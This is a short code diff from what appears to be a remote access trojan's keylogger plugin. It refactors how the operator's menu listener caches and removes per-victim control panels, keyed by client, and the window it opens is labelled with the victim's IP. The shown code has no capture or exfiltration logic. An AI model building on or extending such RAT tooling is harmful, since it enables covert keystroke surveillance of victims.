@@ -22,13 +22,11 @@ public class MenuListener implements RATMenuItemActionListener {
 		try {
 			if (clients.size() > 0) {
 				final Client client = clients.get(0);
-				BaseControlPanel panel = null;
+				BaseControlPanel panel = KeyloggerPlugin.entry.get(client);
 
-				if (KeyloggerPlugin.entry.getInstances().containsKey(client.getIP())) {
-					panel = KeyloggerPlugin.entry.getInstances().get(client.getIP());
-				} else {
+				if (panel == null) {
 					panel = KeyloggerPlugin.entry.newPanelInstance(client);
-					KeyloggerPlugin.entry.getInstances().put(client.getIP(), panel);
+					KeyloggerPlugin.entry.put(client, panel);
 				}
 				
 				final BaseControlPanel finalPanel = panel;
@@ -38,7 +36,7 @@ public class MenuListener implements RATMenuItemActionListener {
 					@Override
 					public void windowClosing(WindowEvent arg0) {
 						finalPanel.onClose();
-						KeyloggerPlugin.entry.getInstances().remove(client.getIP());
+						KeyloggerPlugin.entry.remove(client);
 					}
 				});
 				frame.setTitle("Keylogger - " + client.getIP());
